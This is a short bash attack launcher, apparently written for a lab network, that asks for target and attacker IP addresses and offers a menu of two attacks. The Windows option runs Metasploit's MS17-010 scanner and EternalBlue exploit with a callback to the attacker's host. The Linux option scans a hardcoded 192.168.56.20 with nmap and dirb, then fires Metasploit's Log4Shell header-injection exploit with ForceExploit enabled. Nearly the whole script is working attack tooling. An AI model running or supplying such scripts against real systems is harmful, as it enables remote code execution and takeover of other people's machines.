#! /bin/bash

echo "################################"
echo "#				     #"
echo "#		WELCOME 	     #"
echo "#  	By: Cr4zyD14m0nd     #"
echo "#				     #"
echo "################################"

ifconfig
echo "Please enter your IP to start the scan, for example 192.168.0.1"
read IP
echo "Please enter the CDIR of your ip, for example /24"
read CDIR
echo "Starting the scan!!!"
#nmap -O $IP/$CDIR

echo "Select an option with a number: "
select opt in Ataque-A-Windows Ataque-A-Linux; do
case $opt in 

Ataque-A-Windows)
echo "Enter the IP of the windows machine scaned before"
read WinIp
echo "Enter your IP"
read AttackerIP
echo "Starting scan for Eternalblue vulnerability!!!"
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOST $WinIP; run; use exploit/windows/smb/ms17_010_eternalblue; set LHOST $AttackerIP; set RHOST $WinIp; run;"
;;

Ataque-A-Linux)
echo "Enter the IP of the Linux machine scaned before"
read LinuxIP
echo "Enter your IP"
read AttackerIP
nmap -sV 192.168.56.20
dirb http://192.168.56.20:8080
echo "log" >> /usr/share/dirb/wordlists/common.txt
dirb http://192.168.56.20:8080/app
msfconsole -q -x "use exploit/multi/http/log4shell_header_injection; set RHOST $LinuxIP; set LHOST $AttackerIP; set HTTP_HEADER x-log; set RPORT 8080; set TARGETURI /app/log; set HTTP_SRVPORT 8000; set SRVHOST $AttackerIP; set ForceExploit true; run;"

;;

esac
done
